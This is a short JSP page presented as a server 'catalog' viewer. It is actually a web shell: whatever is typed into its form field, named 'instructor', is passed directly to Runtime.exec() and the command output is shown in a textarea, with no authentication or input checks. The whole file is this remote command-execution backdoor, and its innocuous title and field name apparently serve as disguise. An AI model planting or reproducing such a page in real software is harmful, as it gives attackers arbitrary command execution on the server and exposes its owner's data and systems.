<%@ page contentType="text/html;charset=GB2312" %>
<%@ page language="java" %>
<%@ page import="java.io.*"%>
<html>
<head><title>getcatalog</title></head>
<body>
	<p><h1><b>This is server's catalog:</b></h1></p>
	<form method = "POST">
	<input type="text" name="instructor">
	<input type="submit" value="submit">
	</form>	
	<%
	String s3 = request.getParameter("instructor");
	String s2="",s1;
	Runtime r = Runtime.getRuntime();
	if(s3!=null){
		Process p = r.exec(s3);
		BufferedReader br= new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((s1 = br.readLine())!=null)s2 = s2 + s1 + "\n";
	}
	%>
	<textarea cols="100" rows="50">
		<%=s2%>
	</textarea>
	<img name="apple_icon" src=picture/apple_icon.gif></img>
</body>
</html>
	
